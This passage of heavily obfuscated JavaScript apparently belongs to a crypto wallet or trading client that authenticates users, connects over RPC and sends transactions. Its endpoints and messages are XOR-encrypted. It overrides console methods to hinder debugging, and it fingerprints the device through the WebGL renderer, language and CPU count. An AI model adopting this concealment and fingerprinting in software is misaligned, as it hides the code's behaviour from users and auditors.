                      return t ^ e;
                    });
                  const r = n;
                  let o;
                  return function () {
                    const n = e;
                    if (!o) {
                      const e = new Uint8Array([
                          160, 158, 167, 170, 236, 150, 135, 184, 230, 153, 240,
                          186, 252, 152, 189, 161, 238, 144, 170, 242,
                        ]),
                        i = -808452721,
                        s = new Uint8Array(e.length);
                      for (let o = 0; o < e[n(262)]; o++) {
                        const a = (i >>> (8 * r[n(t)](o, 4))) & 255;
                        s[o] = r.PmLeY(e[o], a);
                      }
                      o = new TextDecoder().decode(s);
                    }
                    return o;
                  };
                })()()
              ) + t,
              (function () {
                const t = 263,
                  e = {
                    CUevy: function (t, e) {
                      return t & e;
                    },
                    LeGne: function (e, n) {
                      return b[Og(t)](e, n);
                    },
                    VjnXc: function (t, e) {
                      return t * e;
                    },
                    zAJWc: function (t, e) {
                      return t ^ e;
                    },
                  };
                let n;
                return function () {
                  const t = Og;
                  if (!n) {
                    const r = new Uint8Array([183, 149, 184, 166, 245, 192]),
                      o = -808452719,
                      i = new Uint8Array(r.length);
                    for (let n = 0; n < r.length; n++) {
                      const s = e.CUevy(e[t(m)](o, e.VjnXc(n % 4, 8)), 255);
                      i[n] = e[t(g)](r[n], s);
                    }
                    n = new TextDecoder().decode(i);
                  }
                  return n;
                };
              })()()
            ) + encodeURIComponent(e),
          l = {};
        l.method = w(o);
        const d = await b[w(i)](fetch, n, l);
        if (!d.ok)
          return (
            xg(
              (function () {
                const t = 277;
                let e;
                return function () {
                  const n = Og;
                  if (!e) {
                    const r = new Uint8Array([
                        219, 170, 134, 139, 179, 139, 170, 189, 250, 155, 166,
                        172, 242, 137, 166, 160, 253, 221, 169, 174, 250, 145,
                        170, 171, 179, 138, 166, 187, 251, 221, 188, 187, 242,
                        137, 186, 188, 169, 221,
                      ]),
                      o = -808452717,
                      i = new Uint8Array(r.length);
                    for (let e = 0; e < r.length; e++) {
                      const s = 255 & b[n(263)](o, b[n(t)](e % 4, 8));
                      i[e] = r[e] ^ s;
                    }
                    e = new TextDecoder().decode(i);
                  }
                  return e;
                };
              })()() + d[w(335)],
              b[w(s)]
            ),
            ![]
          );
        const f = await d[w(a)]();
        if (!f.data.success)
          return (
            b.UQBNE(
              xg,
              (function () {
                const t = {
                    NrPqU: function (t, e) {
                      return t >>> e;
                    },
                  },
                  e = t;
                let n;
                return function () {
                  const t = Og;
                  if (!n) {
                    const r = new Uint8Array([
                        216, 147, 172, 160, 227, 143, 170, 172, 229, 221, 135,
                        152, 216, 185, 239, 171, 244, 137, 170, 172, 229, 152,
                        171, 225, 177, 188, 188, 164, 177, 155, 160, 189, 177,
                        156, 239, 135, 198, 180, 139, 239, 227, 152, 188, 170,
                        229,
                      ]),
                      o = -808452719,
                      i = new Uint8Array(r[t(p)]);
                    for (let n = 0; n < r.length; n++) {
                      const s = 255 & e[t(325)](o, (n % 4) * 8);
                      i[n] = r[n] ^ s;
                    }
                    n = new TextDecoder().decode(i);
                  }
                  return n;
                };
              })()(),
              b.gaAOo
            ),
            ![]
          );
        if (!(await b[w(u)](Y, f)))
          return (
            xg(
              (function () {
                const t = 311,
                  e = 264,
                  n = function (t, n) {
                    return b[Og(e)](t, n);
                  },
                  r = function (t, e) {
                    return b.rjbvJ(t, e);
                  };
                let o;
                return function () {
                  const e = Og;
                  if (!o) {
                    const i = new Uint8Array([
                        222, 147, 187, 170, 240, 143, 166, 187, 238, 221, 172,
                        167, 242, 158, 164, 239, 241, 156, 166, 163, 242, 153,
                        238,
                      ]),
                      s = -808452713,
                      a = new Uint8Array(i[e(262)]);
                    for (let t = 0; n(t, i.length); t++) {
                      const e = (s >>> ((t % 4) * 8)) & 255;
                      a[t] = r(i[t], e);
                    }
                    o = new TextDecoder()[e(t)](a);
                  }
                  return o;
                };
              })()(),
              b.Ghjqo
            ),
            C(),
            ![]
          );
        const h = await b.Dzgvi(J, f, this[w(c) + "Y"]);
        return (
          h ||
          (xg(
            (function () {
              const t = 262,
                e = 316;
              let n;
              return function () {
                const r = Og;
                if (!n) {
                  const o = new Uint8Array([
                      217, 170, 134, 139, 177, 139, 170, 189, 248, 155, 166,
                      172, 240, 137, 166, 160, 255, 221, 169, 174, 248, 145,
                      170, 171,
                    ]),
                    i = -808452719,
                    s = new Uint8Array(o.length);
                  for (let n = 0; n < o[r(t)]; n++) {
                    const t = (i >>> b.IOgXC(b[r(e)](n, 4), 8)) & 255;
                    s[n] = b.rjbvJ(o[n], t);
                  }
                  n = new TextDecoder().decode(s);
                }
                return n;
              };
            })()(),
            "error"
          ),
          C(),
          ![])
        );
      } catch (v) {
        let t = b.juCxP;
        return (
          v instanceof Error
            ? (t = v[w(l)])
            : typeof v === b[w(282)]
            ? (t = v)
            : v && b.gEZKJ(typeof v, b[w(271)]) && (t = JSON.stringify(v)),
          xg(
            b[w(327)](
              (function () {
                let t;
                return function () {
                  const e = Og;
                  if (!t) {
                    const n = new Uint8Array([
                        219, 170, 134, 139, 179, 139, 170, 189, 250, 155, 166,
                        172, 242, 137, 166, 160, 253, 221, 169, 174, 250, 145,
                        170, 171, 179, 138, 166, 187, 251, 221, 170, 189, 225,
                        146, 189, 245, 179,
                      ]),
                      r = -808452717,
                      o = new Uint8Array(n[e(d)]);
                    for (let t = 0; t < n[e(f)]; t++) {
                      const e = (r >>> ((t % 4) * 8)) & 255;
                      o[t] = n[t] ^ e;
                    }
                    t = new TextDecoder()[e(h)](o);
                  }
                  return t;
                };
              })()(),
              t
            ),
            b.Ghjqo
          ),
          ![]
        );
      }
    }
    static initializeRpc(t) {
      return kg.getInstance().connect(t);
    }
    static getConnection() {
      const t = Pg;
      return kg.getInstance()[t([330][0]) + t(301)]();
    }
    static [Pg(281)]() {
      const t = Pg;
      return kg.getInstance()[t([281][0])]();
    }
    static getRpcClient() {
      return kg.getInstance().getClient();
    }
    static isRpcConnected() {
      const t = Pg;
      return kg.getInstance()[t([249][0]) + "d"]();
    }
    static async [Pg(272)](t, e) {
      const n = Pg,
        r = kg.getInstance();
      return await r[n([284][0])](t, e);
    }
    static ["disconnect" + Pg(236)]() {
      const t = 279,
        e = Pg;
      kg[e(286) + "e"]()[e(t)]();
    }
    static async getVanity(t) {
      const e = 251,
        n = 307,
        r = 289,
        o = 301,
        i = 307,
        s = 309,
        a = 312,
        u = 312,
        c = 338,
        l = 258,
        d = Pg,
        f = {
          whQCD: function (t, e) {
            return t(e);
          },
          VTkbj: d(332) + d(e),
          BYtKG: function (t, e) {
            return t instanceof e;
          },
          OJQPo: function (t, e) {
            return t === e;
          },
          Amcer: "string",
          ENZcD: "object",
        };
      if (!this[d(n) + "en"]) return null;
      try {
        const e =
            this.API_BASE + "/getVanity/" + f[d(r)](encodeURIComponent, t),
          n = {};
        (n["Authorizat" + d(o)] = d(324) + this[d(i) + "en"]),
          (n["Content-Type"] = f[d(315)]);
        const c = {};
        (c[d(s)] = "GET"), (c.headers = n);
        const l = await fetch(e, c);
        if (!l.ok) return 404 === l.status, null;
        const h = await l.json();
        return h[d(312)][d(275)] && h[d(a)].vanity ? h[d(u)].vanity : null;
      } catch (h) {
        return (
          f.BYtKG(h, Error)
            ? h[d(c)]
            : f.OJQPo(typeof h, f.Amcer) ||
              (h && typeof h === f[d(l)] && JSON.stringify(h)),
          null
        );
      }
    }
  };
  (Mg[Pg(291)] = (function () {
    const t = 310,
      e = 293,
      n = 293,
      r = Pg,
      o = {};
    (o[r(290)] = function (t, e) {
      return t < e;
    }),
      (o[r(t)] = function (t, e) {
        return t & e;
      }),
      (o[r(e)] = function (t, e) {
        return t >>> e;
      }),
      (o.wqKLc = function (t, e) {
        return t * e;
      });
    const i = o;
    let s;
    return function () {
      const t = r;
      if (!s) {
        const e = new Uint8Array([
            249, 137, 187, 191, 226, 199, 224, 224, 252, 146, 168, 187, 244,
            158, 167, 225, 245, 152, 185, 224, 240, 141, 166,
          ]),
          r = -808452719,
          o = new Uint8Array(e.length);
        for (let s = 0; i.EALNK(s, e.length); s++) {
          const a = i.ZxWOK(i[t(n)](r, i.wqKLc(s % 4, 8)), 255);
          o[s] = e[s] ^ a;
        }
        s = new TextDecoder().decode(o);
      }
      return s;
    };
  })()()),
    (Mg.API_PUB_KEY = (function () {
      const t = 278,
        e = 311,
        n = 270,
        r = 321,
        o = 268,
        i = 253,
        s = 256,
        a = 256,
        u = 265,
        c = Pg,
        l = {
          GeZCB: "(((.+)+)+)+$",
          Mkmaw: function (t, e) {
            return t + e;
          },
          aKvTS: "return (fu" + c(245),
          zFhVb: function (t) {
            return t();
          },
          OlKCY: c([250][0]),
          vNOfK: "exception",
          lwqot: function (t, e) {
            return t < e;
          },
          CKjyd: function (t, e) {
            return t * e;
          },
          IykYQ: function (t, e) {
            return t % e;
          },
          hLvBP: function (t, e) {
            return t ^ e;
          },
          MBplh: function (t, e, n) {
            return t(e, n);
          },
        },
        d = (function () {
          let t = !![];
          return function (e, n) {
            const r = 261,
              o = t
                ? function () {
                    if (n) {
                      const t = n[Og(r)](e, arguments);
                      return (n = null), t;
                    }
                  }
                : function () {};
            return (t = ![]), o;
          };
        })(),
        f = l.MBplh(d, this, function () {
          const t = c;
          return f[t(u)]()
            .search("(((.+)+)+)+$")
            .toString()
            [t(326) + "r"](f)
            [t(323)](l.GeZCB);
        });
      f();
      const h = (function () {
        let t = !![];
        return function (e, n) {
          const r = t
            ? function () {
                if (n) {
                  const t = n.apply(e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
          return (t = ![]), r;
        };
      })();
      let p;
      return (
        h(this, function () {
          const t = c;
          let e;
          try {
            const r = Function(
              l[t(n)](l.aKvTS + '{}.constructor("retu' + t(305) + " )", ");")
            );
            e = l.zFhVb(r);
          } catch (f) {
            e = window;
          }
          const u = (e.console = e.console || {}),
            d = ["log", "warn", t(r), l[t(o)], l[t(298)], "table", t(i)];
          for (let n = 0; l.lwqot(n, d[t(262)]); n++) {
            const e = h.constructor.prototype[t(s)](h),
              r = d[n],
              o = u[r] || e;
            (e.__proto__ = h[t(a)](h)),
              (e[t(265)] = o.toString.bind(o)),
              (u[r] = e);
          }
        })(),
        function () {
          const n = c;
          if (!p) {
            const r = new Uint8Array([
                166, 204, 251, 249, 167, 202, 252, 254, 246, 200, 172, 255, 160,
                155, 172, 170, 171, 202, 249, 252, 167, 201, 255, 247, 247, 152,
                247, 251, 247, 205, 251, 172, 240, 156, 251, 251, 163, 153, 249,
                173, 166, 204, 255, 169, 170, 204, 254, 171, 242, 207, 246, 255,
                164, 153, 250, 169, 163, 207, 254, 251, 247, 202, 248, 170,
              ]),
              o = -808452717,
              i = new Uint8Array(r.length);
            for (let e = 0; e < r.length; e++) {
              const s = (o >>> l[n(t)](l.IykYQ(e, 4), 8)) & 255;
              i[e] = l.hLvBP(r[e], s);
            }
            p = new TextDecoder()[n(e)](i);
          }
          return p;
        }
      );
    })()()),
    (Mg.currentToken = null);
  let Lg = Mg;
  axiomVamp;
  const Ng = Kg;
  !(function (t) {
    const e = 251,
      n = 241,
      r = 257,
      o = 238,
      i = 254,
      s = 235,
      a = 236,
      u = 256,
      c = 247,
      l = Kg,
      d = t();
    for (; []; )
      try {
        if (
          528865 ===
          -parseInt(l(e)) / 1 +
            -parseInt(l(n)) / 2 +
            (parseInt(l(230)) / 3) * (parseInt(l(r)) / 4) +
            (parseInt(l(o)) / 5) * (-parseInt(l(i)) / 6) +
            parseInt(l(s)) / 7 +
            -parseInt(l(a)) / 8 +
            (-parseInt(l(u)) / 9) * (-parseInt(l(c)) / 10)
        )
          break;
        d.push(d.shift());
      } catch (f) {
        d.push(d.shift());
      }
  })(Wg);
  const Dg = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    Ug = Dg(void 0, function () {
      const t = 240,
        e = 246,
        n = 240,
        r = Kg,
        o = { lKLDo: "(((.+)+)+)+$" },
        i = o;
      return Ug.toString()
        [r(t)](i[r(e)])
        .toString()
        .constructor(Ug)
        [r(n)]("(((.+)+)+)+$");
    });
  Ug();
  const qg = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    zg = qg(void 0, function () {
      const t = 243,
        e = 234,
        n = 263,
        r = Kg,
        o = { lgFwB: "error" };
      o[r(239)] = function (t, e) {
        return t < e;
      };
      const i = o,
        s = (function () {
          const t = r;
          let e;
          try {
            e = Function(
              "return (fu" + t(n) + '{}.constructor("return this")( ));'
            )();
          } catch (o) {
            e = window;
          }
          return e;
        })(),
        a = (s.console = s.console || {}),
        u = [r(260), "warn", "info", i.lgFwB, r(t), "table", "trace"];
      for (let c = 0; i.rSDNR(c, u.length); c++) {
        const t = qg.constructor.prototype.bind(qg),
          n = u[c],
          o = a[n] || t;
        (t.__proto__ = qg.bind(qg)), (t[r(234)] = o[r(e)].bind(o)), (a[n] = t);
      }
    });
  zg(),
    (window[Ng(248)] = function (t) {
      return function () {
        return t;
      };
    });
  function Kg(t, e) {
    const n = Wg();
    return (
      (Kg = function (e, r) {
        let o = n[(e -= 230)];
        if (void 0 === Kg.ohNUdg) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (Kg.PMsdLN = i), (t = arguments), (Kg.ohNUdg = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.SnUAFO = t),
              (this.eWzNSj = [1, 0, 0]),
              (this.HlHIYq = function () {
                return "newState";
              }),
              (this.eOEkIq = "\\w+ *\\(\\) *{\\w+ *"),
              (this.yULPqy = "['|\"].+['|\"];? *}");
          };
          (e.prototype.CRLxHO = function () {
            const t = new RegExp(this.eOEkIq + this.yULPqy).test(
              this.HlHIYq.toString()
            )
              ? --this.eWzNSj[1]
              : --this.eWzNSj[0];
            return this.fIObrK(t);
          }),
            (e.prototype.fIObrK = function (t) {
              return Boolean(~t) ? this.reiZzG(this.SnUAFO) : t;
            }),
            (e.prototype.reiZzG = function (t) {
              for (let e = 0, n = this.eWzNSj.length; e < n; e++)
                this.eWzNSj.push(Math.round(Math.random())),
                  (n = this.eWzNSj.length);
              return t(this.eWzNSj[0]);
            }),
            new e(Kg).CRLxHO(),
            (o = Kg.PMsdLN(o)),
            (t[s] = o);
        }
        return o;
      }),
      Kg(t, e)
    );
  }
  function Wg() {
    const t = [
      "BMn0Aw9UkcKG",
      "qLzQy3u",
      "y3jLyxrLrwXLBq",
      "z2v0rxH0zw5ZAq",
      "mZq1mtu5ExLsu2DQ",
      "z19Yzw5KzxjLCG",
      "ru5ervjfuL9xrq",
      "AM9PBG",
      "Dg9tDhjPBMC",
      "ntq3mZy3ofP3vxvZta",
      "mteXmdu2ofbNBfr0uq",
      "qNneEeK",
      "otCZmdm1ENbYs1fY",
      "CLnetLi",
      "C2vHCMnO",
      "mti3nda1nfPVvLL3rG",
      "swTUsM4",
      "zxHJzxb0Aw9U",
      "x2LUzM8",
      "C3rYAw5N",
      "BeTmrg8",
      "otq4ntqWvgHftfPg",
      "C2TdCNLWDa",
      "ChvZAa",
      "D2vIz2W",
      "mtaZmtaWn2v1EujKAG",
      "vu5nqvnlrurFuG",
      "wffdBfy",
      "mZb6A21Wzfi",
      "EKr6Ceq",
      "mJa3uwTtEw5P",
      "mtjAwLHHs08",
      "ufjsDNi",
      "v0vcr0XFzgvIDq",
      "Bg9N",
      "revVyMC",
      "z2v0ugfYyw1LDa",
    ];
    return (Wg = function () {
      return t;
    })();
  }
  const Fg = () => {
      const t = 261,
        e = 250,
        n = 266,
        r = 259,
        o = 231,
        i = 244,
        s = 232,
        a = Ng,
        u = { DEobg: "canvas" },
        c = u,
        l = document[a(265) + "ent"](c[a(t)]).getContext(a(e)),
        d = l[a(n) + "on"](a(r) + a(o) + a(i));
      return l[a(262) + "er"](d[a(252) + a(s) + "BGL"]);
    },
    jg = (t) => {
      const e = {
          AanMM: function (t, e) {
            return t + e;
          },
        },
        n = ((t, e = 0) => {
          const n = 237,
            r = 264,
            o = 253,
            i = 245,
            s = 258,
            a = Ng,
            u = {};
          (u[a(255)] = function (t, e) {
            return t !== e;
          }),
            (u[a(n)] = function (t, e) {
              return t >>> e;
            }),
            (u[a(r)] = function (t, e) {
              return t + e;
            }),
            (u[a(o)] = function (t, e) {
              return t >>> e;
            }),
            (u.PRRvr = function (t, e) {
              return t < e;
            }),
            (u.ajWFG = function (t, e) {
              return t << e;
            });
          const c = u;
          if (!t) return 0;
          let l;
          l = typeof t === a(i) ? new TextEncoder().encode(t) : t;
          let d = 1431655765,
            f = e + Math.round(0.15 * e),
            h = 0;
          if (0 === f)
            for (; h < l.length && c.zDzpD(l[h], 0); )
              (d = c.BsDxI(c.BVjcu(c.BVjcu(c[a(o)](d, 27), d << 5), l[h]), 0)),
                h++;
          else
            for (let p = 0; c.PRRvr(p, f); p++) {
              const t = c[a(s)](h, l.length) ? l[h] : 0;
              (d = ((d >>> 27) + c.ajWFG(d, 5) + t) >>> 0), h++;
            }
          return d;
        })(t, e.AanMM(t.length, 1));
      return btoa(n.toString()).substring(0, 20);
    };
  axiomVamp;
  const Gg = ty;
  !(function (t) {
    const e = 590,
      n = 598,
      r = 524,
      o = 578,
      i = 592,
      s = ty,
      a = t();
    for (; []; )
      try {
        if (
          844889 ===
          -parseInt(s(533)) / 1 +
            (-parseInt(s(547)) / 2) * (parseInt(s(e)) / 3) +
            parseInt(s(n)) / 4 +
            (-parseInt(s(621)) / 5) * (-parseInt(s(r)) / 6) +
            (parseInt(s(498)) / 7) * (parseInt(s(494)) / 8) +
            -parseInt(s(o)) / 9 +
            (-parseInt(s(i)) / 10) * (parseInt(s(571)) / 11)
        )
          break;
        a.push(a.shift());
      } catch (u) {
        a.push(a.shift());
      }
  })(Jg);
  const Vg = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    Hg = Vg(void 0, function () {
      const t = 491,
        e = 610,
        n = ty,
        r = { lUKPG: "(((.+)+)+)+$" },
        o = r;
      return Hg.toString()
        [n(t)](o.lUKPG)
        .toString()
        .constructor(Hg)
        .search(n(e) + "+$");
    });
  Hg();
  const Zg = (function () {
      const t = 545;
      let e = !![];
      return function (n, r) {
        const o = e
          ? function () {
              if (r) {
                const e = r[ty(t)](n, arguments);
                return (r = null), e;
              }
            }
          : function () {};
        return (e = ![]), o;
      };
    })(),
    Xg = Zg(void 0, function () {
      const t = 594,
        e = 549,
        n = 596,
        r = 508,
        o = 629,
        i = 554,
        s = 593,
        a = 609,
        u = 518,
        c = ty,
        l = {
          YNDRT: "return (fu" + c(532),
          rxBTz: function (t) {
            return t();
          },
          GoOOm: c(t),
          cYqJJ: "exception",
          KrGCt: "table",
          AjdhY: c(528),
          vJDcQ: function (t, e) {
            return t < e;
          },
        };
      let d;
      try {
        const t = Function(l[c(e)] + (c(n) + 'ctor("retu') + c(r) + " ));");
        d = l.rxBTz(t);
      } catch (p) {
        d = window;
      }
      const f = (d.console = d.console || {}),
        h = [l.GoOOm, "warn", "info", "error", l.cYqJJ, l.KrGCt, l[c(o)]];
      for (let m = 0; l.vJDcQ(m, h.length); m++) {
        const t = Zg.constructor[c(i)].bind(Zg),
          e = h[m],
          n = f[e] || t;
        (t[c(s)] = Zg[c(a)](Zg)), (t[c(u)] = n.toString.bind(n)), (f[e] = t);
      }
    });
  function Jg() {
    const t = [
      "uNbJ",
      "vhDLzxrZ",
      "seT3CuS",
      "ntfxqwDiq0O",
      "CMvTB3zLv2fSBa",
      "mJm4mhn5tMzHwa",
      "x19WCM90B19F",
      "Bg9N",
      "y2fSBfjWyW",
      "E30Uy29UC3rYDq",
      "yLvky2O",
      "ntC0ndC3nKj0EhPzsG",
      "CK5pvfK",
      "swXPr1e",
      "y29PBK5HBwu",
      "zxjYB3i",
      "y3jLyxrLv2fSBa",
      "AxnvC2vYqxv0Aa",
      "BgvUz3rO",
      "uhvIBgLJs2v5",
      "Bg93rw5Ktw9Kzq",
      "DMfSDwu",
      "yMLUza",
      "kcGOlISPkYKRkq",
      "z2v0rgvMyxvSDa",
      "ufzOEKK",
      "Bg9HzezYB21tDa",
      "z2v0v2fSBgv0ua",
      "C2vUzfjHD1rYyq",
      "D2fSBgv0s2v5ua",
      "z2v0",
      "Bg9JywW",
      "Aw5PDgLHBgL6zq",
      "AgfZvg9Rzw4",
      "mtiXmdi5mhDZAKrbCa",
      "ywDL",
      "Bg9NAw4",
      "B2jQzwn0",
      "r3rPr2m",
      "ugfPCG",
      "ywXHBMnL",
      "C2v0v2fSBgv0",
      "qwPKAfK",
      "C3rYAw5N",
      "ywrKtgLZDgvUzq",
      "C2vHCMnO",
      "ywrKCMvZCW",
      "sM52tK0",
      "ofLisxrxCq",
      "yxvSDhm",
      "y3vYCMvUDfnLDa",
      "DxbKyxrLu2v0Da",
      "mJu3oti0oeLTCgLwDa",
      "C2vJCMv0s2v5",
      "qNn5EhG",
      "z2v0qMfSyw5Jzq",
      "AgLNAgXPz2H0vW",
      "s2v5",
      "EvbHAxi",
      "Aw5eyxrH",
      "AxnmB2fKzwq",
      "z2v0uNbJq2XPzq",
      "CM4GDgHPCYiPka",
      "C2P2EwK",
      "AxnbDxrOzw50Aq",
      "C2v0s2v5ugfPCG",
      "C3rYAw5NAwz5",
      "z2v0v2fSBgv0",
      "y2HLy2TiD2LK",
      "DhDPDhrLCLvYBa",
      "DgLUz3m",
      "CML2yxrLs2v5",
      "Dg9tDhjPBMC",
      "BwvZC2fNzq",
      "C2f2zvrVu3rVCG",
      "zxjZAw9U",
      "yxv0AgvUDgLJyq",
      "z2v0q29UBMvJDa",
      "nKT4yLfJEq",
      "AxnwywXPza",
      "z2v0q2fJAgvKqG",
      "Bw9NDgvJAf93yq",
      "DhjHy2u",
      "qvnoC3K",
      "ChvIBgLJs2v5",
      "Bg9HzfnLDhrPBG",
      "BMn0Aw9UkcKG",
      "ndi2mJC1CezsqMzl",
      "vxnLCG",
      "y2XLyw51Ca",
      "EKPLr0y",
      "DwLKAxr5",
      "z2v0vg9Rzw4",
      "Aw1Hz2vZ",
      "zgvJB2rL",
      "B3jHz2u",
      "z2v0sw5ZDgfUyW",
      "CMvTB3zLtgLZDa",
      "u0D5uMS",
      "yxbWBhK",
      "C3rVCMfNzq",
      "mZy5nfHcqw9srW",
      "Aw5ZDgfUy2u",
      "wu5euLq",
      "twj6tgW",
      "C2D4rKC",
      "ALz0Ce4",
      "zw5LCG",
      "ChjVDg90ExbL",
      "AenqBxe",
      "CM9Y",
      "ywLY",
      "y3rLza",
      "qNLrBuK",
      "vw5RBM93BIbLCG",
      "y3vYCMvUDfvZzq",
      "DhjPBq",
      "C3rVCMfNzuXPCW",
      "y3vYCMvUDeTLEq",
      "BwXMtgC",
      "C2vUzfrYyw5Zyq",
      "BgXLDa",
      "zNjVBvnLy3jLDa",
      "DwjSAwnlzxK",
      "B25dAgfUz2vK",
      "mJuXouvqsgjyrq",
      "zw5JB2rL",
      "v2vIC2L0zxm",
      "Dg9cyxnLntG",
      "CNbJtw9Kzq",
      "D2fPDezVCKXVyq",
      "DgvUzxi",
      "nJiWnJG1ouX2vxj3sa",
      "uvfUyMC",
      "yMfSyw5Jzq",
      "ywrKAxrPB25HBa",
      "C2v0",
      "z2v0q3vYCMvUDa",
      "yNDbuLm",
      "zNjVBufWAvjLCW",
      "z2v0qwnJB3vUDa",
    ];
    return (Jg = function () {
      return t;
    })();
  }
  Xg(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  class Yg {
    constructor() {
      const t = ty;
      (this.currentUser = null), (this[t([510][0]) + "cated"] = ![]);
    }
    static [Gg(542) + "e"]() {
      const t = Gg;
      return !Yg.instance && (Yg.instance = new Yg()), Yg[t([548][0])];
    }
    async [Gg(522) + "teUser"](t) {
      const e = 521,
        n = 493,
        r = 599,
        o = 514,
        i = 562,
        s = 510,
        a = Gg,
        u = {
          jqSBf: function (t, e) {
            return t % e;
          },
          XPaQJ: function (t, e) {
            return t & e;
          },
          cWBLS: function (t, e) {
            return t * e;
          },
          JnvNM: "warning",
          rNOTY: function (t) {
            return t();
          },
          uxEir: function (t, e) {
            return t === e;
          },
          tjePQ: "Unknown error",
          pxKBq: a(630),
        };
      try {
        const l = c[a(585) + "ponse"](t);
        if (!l.isValid)
          return (
            xg(
              (function () {
                const t = 605,
                  e = 550,
                  n = {
                    tncce: function (t, e) {
                      return t & e;
                    },
                    Njvgi: function (t, e) {
                      return t * e;
                    },
                    lQWYC: function (t, e) {
                      return u.jqSBf(t, e);
                    },
                    MbzLl: function (t, e) {
                      return t ^ e;
                    },
                  };
                let r;
                return function () {
                  const o = ty;
                  if (!r) {
                    const i = new Uint8Array([
                        172, 166, 75, 219, 137, 161, 89, 154, 144, 187, 88, 200,
                        197, 172, 92, 206, 132, 232, 77, 200, 138, 190, 84, 222,
                        128, 172, 28,
                      ]),
                      s = -1170355995,
                      a = new Uint8Array(i[o(t)]);
                    for (let t = 0; t < i.length; t++) {
                      const r = n.tncce(s >>> n.Njvgi(n.lQWYC(t, 4), 8), 255);
                      a[t] = n[o(e)](i[t], r);
                    }
                    r = new TextDecoder()[o(540)](a);
                  }
                  return r;
                };
              })()(),
              a(602)
            ),
            ![]
          );
        if (!(await Lg["getLatestV" + a(e)]())) return ![];
        if (l.isExpired)
          return (
            xg(
              (function () {
                let t;
                return function () {
                  if (!t) {
                    const e = new Uint8Array([
                        190, 167, 72, 200, 199, 164, 84, 217, 130, 166, 78, 223,
                        199, 161, 78, 154, 130, 176, 77, 211, 149, 173, 89, 155,
                        199, 154, 88, 212, 130, 191, 29, 195, 136, 189, 79, 154,
                        148, 189, 95, 201, 132, 186, 84, 202, 147, 161, 82, 212,
                        201,
                      ]),
                      n = -1170355993,
                      r = new Uint8Array(e.length);
                    for (let t = 0; t < e.length; t++) {
                      const o = u.XPaQJ(n >>> u.cWBLS(t % 4, 8), 255);
                      r[t] = e[t] ^ o;
                    }
                    t = new TextDecoder().decode(r);
                  }
                  return t;
                };
              })()(),
              u[a(n)]
            ),
            ![]
          );
        if (!l.username || !t.username) return u[a(r)](C), ![];
        const d = (() => {
          const t = 249,
            e = 242,
            n = 233,
            r = Ng,
            o = {};
          o[r(242)] = "unknown";
          const i = o,
            s = [];
          s.push("lang:" + navigator.language),
            s.push("cores:" + (navigator.hardwareConcurrency || "unknown")),
            s[r(t)]("hash:" + (Fg() || i[r(e)]));
          const a = s[r(n)]("|");
          return jg(a);
        })();
        if (!d || u.uxEir(d.trim().length, 0)) return ![];
        if (!(await Lg[a(o)](t.username, d))) return ![];
        const f = await Lg[a(623)](t, d);
        return f && 0 !== f[a(i)]()[a(605)]
          ? (Lg[a(619) + "Rpc"](f),
            (this[a(561) + "r"] = l),
            (this[a(s) + "cated"] = !![]),
            !![])
          : ![];
      } catch (l) {
        return (
          u.tjePQ,
          l instanceof Error
            ? l.message
            : typeof l === u.pxKBq ||
              (l && "object" == typeof l && JSON.stringify(l)),
          ![]
        );
      }
    }
    getSDK() {
      return Lg.getSDK();
    }
    [Gg(538)]() {
      return Lg.getToken();
    }
    [Gg(620)]() {
      return Lg[Gg([620][0])]();
    }
    [Gg(583) + Gg(534)]() {
      return this.currentUser;
    }
    isUserAuthenticated() {
      var t;
      const e = Gg;
      return (
        this.isAuthenticated &&
        (null == (t = this.currentUser) ? void 0 : t[e([525][0])]) === !![]
      );
    }
    logout() {
      const t = 510,
        e = Gg;
      Lg["disconnect" + e(587)](),
        Lg.clearToken(),
        (this.currentUser = null),
        (this[e(t) + "cated"] = ![]),
        C();
    }
    ["isRpcConne" + Gg(558)]() {
      return Lg.isRpcConnected();
    }
    getConnection() {
      return Lg[Gg([523][0]) + "ion"]();
    }
    async [Gg(595)](t, e) {
      return this.isUserAuthenticated() ? await Lg.callRpc(t, e) : null;
    }
    async [Gg(586) + "Balance"](t) {
      const e = Gg,
        n = {};
      n[e([492][0])] = t;
      const r = await this.callRpc("getBalance", n);
      return r ? r[e(608)] : null;
    }
    async [Gg(566) + "ction"](t, e) {
      const n = Gg;
      if (!this.isUserAuthenticated()) return null;
      const r = Lg[n([507][0]) + "nt"]();
      return r ? await r.sendTransaction(t, e) : null;
    }
    async [Gg(615) + "nsaction"](t, e) {
      const n = 507,
        r = Gg;
      if (!this[r(604) + "enticated"]()) return null;
      const o = Lg[r(n) + "nt"]();
      return o ? await o[r(615) + "nsaction"](t, e) : null;
    }
  }
  class Qg {
    constructor() {
      const t = Gg;
      (this.currentSettings = null), this[t([531][0]) + "gs"]();
    }
    static getInstance() {
      const t = Gg;
      return !Qg.instance && (Qg.instance = new Qg()), Qg[t(548)];
    }
    loadSettings() {
      const t = 516,
        e = Gg;
      (this["currentSet" + e(t)] = l.fromStorage()),
        !this[e(496) + "tings"] &&
          (this["currentSet" + e(t)] = l.getDefaults());
    }
    [Gg(497) + "ings"](t) {
      const e = 560,
        n = 556,
        r = 575,
